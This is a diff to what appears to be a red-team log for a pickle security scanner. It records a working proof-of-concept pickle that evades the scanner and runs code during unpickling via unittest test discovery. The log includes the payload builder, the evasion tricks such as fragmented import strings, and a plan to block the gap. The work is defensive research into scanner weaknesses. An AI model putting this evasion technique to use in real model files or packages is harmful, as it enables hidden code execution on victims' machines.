@@ -2096,3 +2096,131 @@ Blocking plan:
 Performance note: the fix adds two tuples to a sorted static table checked
 with binary search. It does not add filesystem simulation, `.pth` parsing, or
 cross-literal string reconstruction for fragmented import statements.
+
+## Turn 49 - `unittest.loader.TestLoader.discover` import-execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using stdlib test discovery to
+import attacker-written Python code.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_unittest_discover_marker")
+module_path = Path("/tmp/ma_unittest_discover_exec.py")
+content_parts = [
+    "im",
+    "port pathlib; pathlib.Path(",
+    repr(str(marker)),
+    ").touch()\n",
+]
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_unittest_discover_exec.py"),
+        b"tR\x940",
+        sg("builtins", "str.join"),
+        b"(",
+        s(""),
+        b"(",
+        *(s(part) for part in content_parts),
+        b"ttR\x940",
+        sg("pathlib", "Path.write_text"),
+        b"(h\x00h\x01tR0",
+        sg("unittest.loader", "TestLoader"),
+        b")R\x940",
+        sg("unittest.loader", "TestLoader.discover"),
+        b"(",
+        b"h\x02",
+        s("/tmp"),
+        s(module_path.name),
+        b"tR.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=327`, `bytes_total=327`, `opcode_count=53`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
+  `pathlib.Path.write_text`, `unittest.loader.TestLoader`, and
+  `unittest.loader.TestLoader.discover`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `TestLoader.discover()`
+  call writes `/tmp/ma_unittest_discover_exec.py` but does not create
+  `/tmp/ma_unittest_discover_marker`
+- Unpickle result: the full payload writes the module, runs
+  `TestLoader.discover("/tmp", "ma_unittest_discover_exec.py")`, creates
+  `/tmp/ma_unittest_discover_marker`, and returns a `unittest.suite.TestSuite`
+- RCE mechanism: `discover()` temporarily makes the start directory importable
+  and imports matching Python files. The attacker-written module contains
+  top-level code, so importing it executes attacker-controlled Python during
+  deserialization.
+
+Why the scanner missed it:
+
+- `unittest.loader` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `pathlib.PosixPath`,
+  `builtins.str.join`, `pathlib.Path.write_text`,
+  `unittest.loader.TestLoader`, and
+  `unittest.loader.TestLoader.discover`.
+- The imported module's executable line is assembled from `"im"` and
+  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
+  literal contains an `import` statement, so the suspicious-string heuristic
+  does not fire.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another file-mediated Python execution sink, this
+time through test discovery/import behavior rather than site `.pth` handling.
+The focused next block should add sorted `DANGEROUS_GLOBALS` entries for
+`("unittest.loader", "TestLoader.discover")`,
+`("unittest.loader", "TestLoader.loadTestsFromName")`, and
+`("unittest.loader", "TestLoader.loadTestsFromNames")`, plus a manual-pickle
+oracle regression for the fragmented-import discovery proof. The hot path
+remains static policy lookup.
+
+## Turn 50 - Block `unittest` loader import execution
+
+Blocking plan:
+
+- Add sorted `DANGEROUS_GLOBALS` entries for
+  `unittest.loader.TestLoader.discover`,
+  `unittest.loader.TestLoader.loadTestsFromName`, and
+  `unittest.loader.TestLoader.loadTestsFromNames`. These APIs import
+  attacker-selected modules or files and therefore execute top-level Python
+  during unpickling.
+- Add the equivalent public alias entries exposed through `unittest` and
+  `unittest.loader.defaultTestLoader`, so the same import-execution sink cannot
+  be reached by changing only the dotted global path.
+- Add portable policy coverage for the raw reductions so detection does not
+  depend on running discovery.
+- Add a CPython oracle regression that first proves the fragmented
+  `Path.write_text()` payload only writes the module file, then proves adding
+  `TestLoader.discover(tmp_path, pattern)` imports that module and creates the
+  marker during `pickle.loads()`.
+
+Performance note: the fix adds static policy entries checked by binary search.
+It does not add filesystem simulation, import graph modeling, or cross-literal
+string reconstruction for fragmented import statements.
